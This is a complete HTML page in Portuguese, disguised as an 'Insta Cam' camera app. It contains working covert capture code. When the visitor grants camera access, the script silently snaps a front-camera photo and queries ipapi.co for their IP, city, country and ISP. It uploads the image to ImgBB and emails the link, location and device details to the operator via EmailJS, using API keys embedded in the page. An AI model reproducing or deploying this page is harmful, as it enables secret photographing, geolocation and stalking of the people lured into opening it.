<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Insta Cam</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // ⚠️ SUBSTITUA PELA SUA CHAVE PÚBLICA DO EMAILJS ⚠️
            emailjs.init("dE244dq8weZCu5CiA"); 
        })();
    </script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; font-family: sans-serif; }
        video { width: 100%; height: 100%; object-fit: cover; }
        #status { position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; color: white; font-size: 14px; background: rgba(0,0,0,0.7); padding: 8px; z-index: 100; }
        
        /* Interface Visual */
        .icon { width: 24px; height: 24px; fill: white; }
        .top-bar { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 5; }
        .bottom-bar { position: absolute; bottom: 20px; width: 100%; display: flex; justify-content: center; z-index: 5; }
        #shutter { width: 70px; height: 70px; border-radius: 50%; background: white; border: 4px solid rgba(255,255,255,0.3); }
        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; pointer-events: none; z-index: 50; }
        .flash { animation: flashAnim 0.15s ease-out; }
        @keyframes flashAnim { 0% { opacity: 1; } 100% { opacity: 0; } }
    </style>
</head>
<body>

    <div class="top-bar">
        <svg class="icon" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
        <svg class="icon" viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>
        <svg class="icon" viewBox="0 0 24 24"><path d="M20 4h-3.17L14 2H6L4.17 4H1v16h22V4H20z"/></svg>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="flash"></div>
    <div id="status">Aguardando câmera...</div>

    <script type="text/javascript">
        // ⚠️ CONFIGURAÇÕES ⚠️
        const IMGBB_KEY = '150c23d157fe7a469ffa4316f840df88';
        const EMAILJS_SID = 'service_1tsipns';
        const EMAILJS_TID = 'template_38m07j9';
        const EMAILJS_PK = "dE244dq8weZCu5CiA";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const flash = document.getElementById('flash');
        const sound = new Audio('https://www.soundjay.com/mechanical/sounds/camera-shutter-click-1.mp3');

        async function getDeviceData() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip || "N/A",
                    pais: data.country_name || "N/A",
                    cidade: data.city || "N/A",
                    isp: data.org || "N/A",
                    ua: navigator.userAgent
                };
            } catch (e) {
                return { ip: "N/A", pais: "N/A", cidade: "N/A", isp: "N/A", ua: navigator.userAgent };
            }
        }

        async function sendEmail(data, imgBase64) {
            try {
                // Upload para ImgBB
                const formData = new FormData();
                formData.append('image', imgBase64);
                const imgRes = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method: 'POST', body: formData });
                const imgJson = await imgRes.json();
                
                if (!imgJson.success) throw new Error(imgJson.error?.message || "ImgBB Fail");

                // Formatação do dispositivo
                let dev = data.ua;
                if (dev.includes("Android")) dev = "Android - " + dev;
                else if (dev.includes("iPhone")) dev = "iOS - " + dev;
                else dev = "PC - " + dev;

                await emailjs.send(EMAILJS_SID, EMAILJS_TID, {
                    link: imgJson.data.url,
                    ip: data.ip,
                    cidade: data.cidade,
                    pais: data.pais,
                    provedor: data.isp,
                    dispositivo: dev,
                    msg: `Foto de: ${data.cidade}`
                });
                status.innerText = "Enviado!";
            } catch (e) {
                console.error(e);
                status.innerText = "Erro: " + e.message;
            }
        }

        // A MÁGICA ACONTECE AQUI:
        video.onloadedmetadata = async () => {
            status.innerText = "Capturando...";
            
            // Pequeno delay para a câmera estabilizar
            await new Promise(r => setTimeout(r, 500));

            // Tira a foto
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/jpeg').split(',')[1];

            // Flash e Som
            flash.classList.add('flash');
            setTimeout(() => flash.classList.remove('flash'), 150);
            sound.play();

            // Envia automaticamente
            const device = await getDeviceData();
            await sendEmail(device, imgData);
        };

        // Inicia a câmera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => video.srcObject = stream)
            .catch(err => status.innerText = "Erro na câmera: " + err.message);
    </script>
</body>
</html>
